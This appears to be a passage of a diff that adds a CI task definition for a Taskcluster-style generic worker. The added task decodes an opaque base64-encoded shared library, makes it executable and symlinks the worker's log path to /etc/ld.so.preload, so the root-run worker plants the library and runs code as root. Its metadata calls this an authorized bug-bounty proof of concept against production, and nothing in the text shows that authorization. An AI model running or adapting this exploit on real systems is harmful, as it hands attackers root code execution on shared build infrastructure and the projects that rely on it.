AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoBMAAAAAAACgEQAAAAAAAGATAAAAAAAAAQAAAAAAAAC8AAAAAAAAAAwAAAAAAAAAABAAAAAAAAANAAAAAAAAAKwTAAAAAAAAGQAAAAAAAADwPQAAAAAAABsAAAAAAAAAEAAAAAAAAAAaAAAAAAAAAAA+AAAAAAAAHAAAAAAAAAAIAAAA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AAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA5wAAAAYAAAADAAAAAAAAAAg+AAAAAAAACC4AAAAAAADAAQAAAAAAAAUAAAAAAAAACAAAAAAAAAAQAAAAAAAAAJUAAAABAAAAAwAAAAAAAADIPwAAAAAAAMgvAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADwAAAAAQAAAAMAAAAAAAAA6D8AAAAAAADoLwAAAAAAAHAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA+QAAAAEAAAADAAAAAAAAAFhAAAAAAAAAWDAAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAP8AAAAIAAAAAwAAAAAAAABgQAAAAAAAAGAwAAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAEAQAAAQAAADAAAAAAAAAAAAAAAAAAAABgMAAAAAAAAC0AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAkDAAAAAAAABgAwAAAAAAABwAAAAVAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAPAzAAAAAAAAawIAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAABbNgAAAAAAAA0BAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA' | base64 -d > preload_log_marker.so
+            printf '%s  %s\n' '7631612fd799f5d36989d28b7cbbb6981d91d8bb302ad82cff9ff445ad9a8ce8' preload_log_marker.so | sha256sum -c -
+            chmod 0700 preload_log_marker.so
+
+            # The task owns TASK_WORKDIR, so Linux permits replacing this child pathname
+            # even though the worker created the original directory as root with mode 0700.
+            mv generic-worker generic-worker.original
+            mkdir -m 0700 generic-worker
+            printf '%s\n' "${TASK_WORKDIR}/preload_log_marker.so" > generic-worker/live_backing.log
+            ln -s /etc/ld.so.preload generic-worker/certified.log
+
+            echo 'POC_ARMED: one-shot root UID marker; preload self-cleans on activation'
+      maxRunTime: 300
+      features:
+        chainOfTrust: true
+        backingLog: true
+        liveLog: true
+      logs:
+        live: public/logs/live.log
+        backing: public/logs/live_backing.log
+    metadata:
+      name: Authorized bug-bounty Generic Worker root-marker PoC
+      description: One-shot UID 0 marker with automatic loader cleanup; no secrets, persistence, or pivoting.
+      owner: bug-bounty-researcher@example.invalid
+      source: https://github.com/bughunter0xff/translations
+    tags:
+      purpose: authorized-security-validation
+      containment: one-shot-root-marker
